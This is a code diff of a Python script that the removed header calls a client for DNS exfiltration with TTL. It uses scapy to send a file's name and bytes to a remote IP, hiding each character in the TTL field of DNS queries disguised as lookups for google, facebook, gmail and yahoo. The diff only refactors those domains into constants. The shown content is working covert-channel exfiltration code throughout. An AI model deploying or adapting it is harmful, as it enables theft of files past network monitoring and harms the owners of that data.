@@ -1,13 +1,10 @@
-# Author: Barnabas Koh
-# Date: 03-11-2024
-# Description: Client for DNS Exfiltration with TTL
-
 import sys
 from scapy.all import send, IP, UDP, DNS, DNSQR
 
 BASE_TTL = 64
 DEST_IP = "0.0.0.0"
 SYNC_DOMAIN = "www.google.com"
+FILE_DOMAIN = "www.facebook.com"
 DATA_DOMAIN = "www.gmail.com"
 END_DOMAIN = "www.yahoo.com"
 
@@ -29,15 +26,15 @@ def ord_data(file_name):
 def send_data(file_name, ord_list):
     """Sends SYNC, FILE, DATA and END packets"""
     # Send Sync packet
-    send(IP(dst=DEST_IP,ttl=BASE_TTL)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="www.google.com")),verbose=0)
+    send(IP(dst=DEST_IP,ttl=BASE_TTL)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=SYNC_DOMAIN)),verbose=0)
     # Semd File packet
     for char in file_name:
-        send(IP(dst=DEST_IP,ttl=BASE_TTL+ord(char))/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="www.facebook.com")),verbose=0)
+        send(IP(dst=DEST_IP,ttl=BASE_TTL+ord(char))/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=FILE_DOMAIN)),verbose=0)
     # Send Data packet
     for num in ord_list:
-        send(IP(dst=DEST_IP,ttl=BASE_TTL+num)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="www.gmail.com")),verbose=0)
+        send(IP(dst=DEST_IP,ttl=BASE_TTL+num)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=DATA_DOMAIN)),verbose=0)
     # Send End packet
-    send(IP(dst=DEST_IP,ttl=BASE_TTL)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="www.yahoo.com")),verbose=0)
+    send(IP(dst=DEST_IP,ttl=BASE_TTL)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=END_DOMAIN)),verbose=0)
 
 
 def main():
